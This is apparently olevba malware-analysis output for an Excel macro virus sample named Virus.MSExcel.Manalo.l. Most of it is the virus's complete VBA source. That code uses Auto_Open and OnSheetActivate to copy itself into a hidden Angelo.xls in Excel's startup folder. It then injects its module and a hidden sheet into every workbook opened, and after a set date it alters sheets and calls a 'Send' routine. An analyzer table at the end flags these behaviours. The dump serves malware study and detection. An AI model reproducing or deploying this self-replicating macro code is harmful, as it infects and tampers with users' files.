olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet511111111.cls 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet511111111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gene.bas 
in file: Virus.MSExcel.Manalo.l-badf15cf3c34cd0ded7d798472c35fb757b5808d - OLE stream: '_VBA_PROJECT_CUR/VBA/Gene'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'...........................................
'INC: 86 years and going strong. More power!
'July 26, 1914
'
'Electronics and Communications Engineering
'New Era University
'Milton Hills Subd., Diliman, Quezon City
'...........................................
'By AnGeL - Anak ng Sugo
'...........................................


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "Run"
End Sub
Sub Run()
Attribute Run.VB_ProcData.VB_Invoke_Func = " \n14"
        
On Error GoTo Over

SU$ = Application.StartupPath
f$ = Dir(SU$ & "\" & "Angelo.xls")
ngayon = Format(Now, "yyyymmdd")
'MsgBox (Application.Version)

If f$ <> "Angelo.xls" Then GoTo FDNE Else GoTo IOF

FDNE:
         
   INF$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set bago = Workbooks.Add
    With bago
        .Title = ""
        .Subject = ""
    End With
   
   NWB$ = ActiveWorkbook.Name
   Bed$ = Workbooks(NWB$).Sheets(1).Name

   If Bed$ <> "Gene" _
      Then
        Workbooks(INF$).Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(NWB$).Sheets(1)
        'Workbooks(INF$).Sheets("Gene").Copy Before:=Workbooks(NWB$).Sheets(1)
        'Workbooks(NWB$).Sheets("Gene").Visible = False
        Workbooks(INF$).VBProject.VBComponents("Gene").Export ("c:\1")
        Workbooks(NWB$).VBProject.VBComponents.Import ("c:\1")
        Workbooks(NWB$).Sheets("THE CHURCH OF CHRIST").Visible = False
      Else
   End If

   ActiveWindow.Visible = False
      
   Workbooks(NWB$).SaveAs FileName:=Application.StartupPath & "/" & "Angelo.xls"

GoTo Over

IOF:
        
   Angelo$ = ActiveWorkbook.Name
   For i = 1 To Workbooks(Angelo$).VBProject.VBComponents.Count
   If Workbooks(Angelo$).VBProject.VBComponents(i).Type = 1 Then _
   If Workbooks(Angelo$).VBProject.VBComponents(i).Name = "Gene" Then GoTo Brk
   Next
   i = i - 1
Brk:
   FirstBed$ = Workbooks(Angelo$).VBProject.VBComponents(i).Name
        
   Application.ScreenUpdating = False
   
   If FirstBed$ <> "Gene" _
      Then
        'Workbooks("Angelo.xls").Sheets("Gene").Copy Before:=Workbooks(Angelo$).Sheets(1)
        Workbooks("Angelo.xls").VBProject.VBComponents("Gene").Export ("c:\1")
        Workbooks(Angelo$).VBProject.VBComponents.Import ("c:\1")
        Workbooks("Angelo.xls").Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(Angelo$).Sheets(1)
        
        'Workbooks(Angelo$).Sheets("Gene").Visible = False
        Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Visible = False
        
Else
If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Name = "Ang Iglesia Ni Cristo"

If (ngayon >= "20000726") Then Workbooks("Angelo.xls").Sheets("THE CHURCH OF CHRIST").Copy Before:=Workbooks(Angelo$).Sheets("Ang Iglesia Ni Cristo")

If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("Ang Iglesia Ni Cristo").Visible = True

If (ngayon >= "20000726") Then Workbooks(Angelo$).Sheets("THE CHURCH OF CHRIST").Visible = False

If (ngayon >= "20000723") Then Application.Run ("Send")

End If

Over:
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "Angelo.xls!Run"

Last:
    
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  THE CHURCH OF CHRIS
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

